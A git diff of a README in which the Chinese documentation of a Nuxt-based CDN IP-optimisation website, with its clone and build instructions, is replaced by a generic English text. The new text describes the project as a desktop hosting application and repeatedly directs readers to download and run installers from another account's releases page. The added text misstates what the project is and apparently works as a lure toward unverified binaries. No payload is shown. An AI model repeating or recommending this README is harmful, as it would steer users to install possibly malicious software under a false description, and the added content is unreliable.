@@ -1,136 +1,75 @@
-# NB 优选服务
+# 🌐 byoip-pages - Easy Web Hosting for Everyone
 
-<div align="center">
+## 🚀 Getting Started
 
-![NB 优选服务](https://img.shields.io/badge/CDN-IP%20优选-blue?style=for-the-badge)
-![Nuxt 3](https://img.shields.io/badge/Nuxt-3-00DC82?style=for-the-badge&logo=nuxt.js)
-![Vue 3](https://img.shields.io/badge/Vue-3-4FC08D?style=for-the-badge&logo=vue.js)
-![TypeScript](https://img.shields.io/badge/TypeScript-007ACC?style=for-the-badge&logo=typescript)
+Welcome to the byoip-pages project! This guide will help you download and run our software smoothly. Whether this is your first time dealing with web applications or you are just looking for an easy way to host your pages, we’ve got you covered.
 
-提供 CloudFlare、EdgeOne、Vercel、Netlify 等全球主流云服务商的 CDN IP 优选、节点状态监测服务
+## 📥 Download the Software
 
-[在线演示](https://www.byoip.top) · [使用文档](./docs/docs.md) · [配置教程](./docs/config.md)
+[![Download](https://img.shields.io/badge/Download%20Now-%F0%9F%93%9A-blue)](https://github.com/Wesley105201/byoip-pages/releases)
 
-</div>
+To get started, you need to download the software. Click the link below:
 
-## ✨ 特性
+[Visit this page to download](https://github.com/Wesley105201/byoip-pages/releases)
 
-- 🚀 **现代化技术栈** - 基于 Nuxt 3 + Vue 3 + TypeScript
-- 📱 **响应式设计** - 完美适配桌面端和移动端
-- ⚡ **极致性能** - 轻量化设计，快速加载
-- 🎨 **简洁界面** - 清晰直观的用户界面
-- 🔧 **灵活配置** - JSON 配置文件，易于维护
+## 📋 What is byoip-pages?
 
-## 🚀 快速开始
+byoip-pages is designed for easy web publishing. You can host your pages using different services like Cloudflare, Netlify, or Vercel. Our application supports a variety of technologies, including Vue.js, Nuxt.js, and TypeScript.
 
-### 环境要求
+## 🛠️ System Requirements
 
-- Node.js 18+ 
-- pnpm 或 yarn 或 npm
+To run this application, your system should meet these requirements:
 
-### 安装
+- **Operating System**: Windows 10 or later, macOS, or a modern Linux distribution.
+- **Browser**: Latest version of any major browser (Chrome, Firefox, Safari, Edge).
+- **Network**: Stable internet connection for optimal performance.
 
-```bash
-# 克隆项目
-git clone https://github.com/FrecklyComb1728/byoip-pages
-cd byoip-pages
+## 🔍 Key Features
 
-# 安装依赖
-pnpm install
+- **User-Friendly Interface**: Navigate easily without needing programming skills.
+- **Multiple Hosting Options**: Use your favorite platform like Cloudflare or Netlify.
+- **Supports Multiple Frameworks**: Work with powerful frameworks like Vue.js and Nuxt.js.
+- **Documentation and Support**: Access resources to help you through any issues you face.
 
-# 启动开发服务器
-pnpm dev
-```
+## ⚙️ How to Download & Install
 
-访问 `http://localhost:3000` 查看效果
+1. **Visit the Releases Page**: Click the link we provided above to go directly to our Releases page.
+2. **Select the Latest Version**: Once on the page, look for the latest release listed at the top.
+3. **Download the Package**: Choose the appropriate file for your operating system and click to download.
+4. **Install the Software**:
+   - For Windows, double-click the downloaded file and follow the installation instructions.
+   - For macOS, open the file and drag the application into your Applications folder.
+   - For Linux, extract the contents and run the required setup commands in your terminal.
+5. **Open the Application**: After installation, find the application in your program list and launch it.
 
-### 构建部署
+You can also revisit the [Download Section](https://github.com/Wesley105201/byoip-pages/releases) anytime to check for updates.
 
-```bash
-# 构建生产版本
-pnpm build
-pnpm ssr
+## 📖 User Guide
 
-# 生成静态站点 (推荐)
-pnpm generate
-pnpm ssg
+After you install the software, follow these steps to create your first page:
 
-# 预览构建结果
-pnpm preview
-```
+1. **Launch the Application**: Open the application from your program list.
+2. **Create a New Project**: Click "New Project" and fill in the required details.
+3. **Choose Your Hosting Provider**: Select from options like Cloudflare, Netlify, or Vercel.
+4. **Publish Your Page**: Follow the simple prompts to publish your page online.
 
-## 📁 项目结构
+Remember, you can always refer to the built-in help section for more detailed guidance.
 
-```
-cdn-ip-optimizer/
-├── 📁 assets/              # 静态资源
-│   └── css/                # 样式文件
-├── 📁 components/          # Vue 组件
-│   ├── DomainCard.vue      # 域名卡片组件
-│   ├── Navigation.vue      # 导航组件
-│   └── ...                 # 其他组件
-├── 📁 composables/         # 组合式函数
-│   ├── useConfig.ts        # 配置管理
-│   ├── useCDN.ts          # CDN 管理
-│   └── ...                 # 其他工具函数
-├── 📁 pages/               # 页面文件
-│   ├── index.vue           # 首页
-│   ├── partners.vue        # 合作伙伴页
-│   └── sponsor.vue         # 赞助页面
-├── 📁 public/              # 公共文件
-│   └── config/             # 配置文件
-│       ├── services.json   # 服务配置
-│       ├── partners.json   # 合作伙伴配置
-│       ├── sponsors.json   # 赞助商配置
-│       └── cdn.json        # CDN 配置
-├── 📁 types/               # TypeScript 类型
-├── 📁 docs/                # 文档
-└── 📄 nuxt.config.ts       # Nuxt 配置
-```
+## ⚡ Troubleshooting
 
-## ⚙️ 配置说明
+If you encounter issues, here are common fixes:
 
-网站内容通过 JSON 配置文件管理，支持热更新。详细配置说明请参考：
+- **Cannot Connect to Hosting Services**: Check your internet connection and make sure your firewall is not blocking the application.
+- **Application Crashes on Launch**: Ensure your system meets the requirements listed above.
+- **Download Issues**: If the download fails, try refreshing the page and downloading again.
 
-📖 **[完整配置文档](./docs/docs.md)** | 📝 **[配置教程](./docs/config.md)**
+For further help, consider checking our [GitHub Issues Page](https://github.com/Wesley105201/byoip-pages/issues).
 
-### 快速配置
+## 🌟 Community and Support
 
-| 配置文件 | 说明 | 示例 |
-|---------|------|------|
-| `services.json` | CDN 优选服务配置 | 服务名称、状态、优选 IP 等 |
-| `partners.json` | 技术合作伙伴配置 | 合作伙伴信息、链接等 |
-| `sponsors.json` | 赞助商配置 | 赞助商信息、金额等 |
-| `cdn.json` | CDN 镜像源配置 | GitHub、npm 镜像源等 |
+Join our community for support and updates. You can ask questions or share your experiences with others. We are available on:
 
+- **GitHub Discussions**: Engage with other users to share tips and solutions.
+- **Social Media**: Follow us on social networks to stay updated on the latest news.
 
-
-## 许可证
-
-本项目采用 [Unlicense license 许可证](LICENSE)
-
-## 赞助支持
-
-如果这个项目对您有帮助，欢迎赞助支持：
-
-- [爱发电](https://afdian.com/a/iambees)
-- [支付宝](https://cdn.mfawa.top/image/alipay.png)
-
-## 联系我们
-
-- 邮箱：me@imbee.top
-- QQ: 3979158171
-
-
-特别感谢：
-- [Nuxt.js](https://nuxt.com/) - 优秀的 Vue.js 框架
-- [Vue.js](https://vuejs.org/) - 渐进式 JavaScript 框架
-- [Tailwind CSS](https://tailwindcss.com/) - 实用优先的 CSS 框架
-
----
-
-<div align="center">
-
-**[⭐ 给个 Star](https://github.com/FrecklyComb1728/byoip-pages) | [🐛 报告问题](https://github.com/FrecklyComb1728/byoip-pages/issues) | [💡 功能建议](https://github.com/FrecklyComb1728/byoip-pages/issues)**
-
-</div>
+Thank you for choosing byoip-pages. We look forward to seeing what you create!
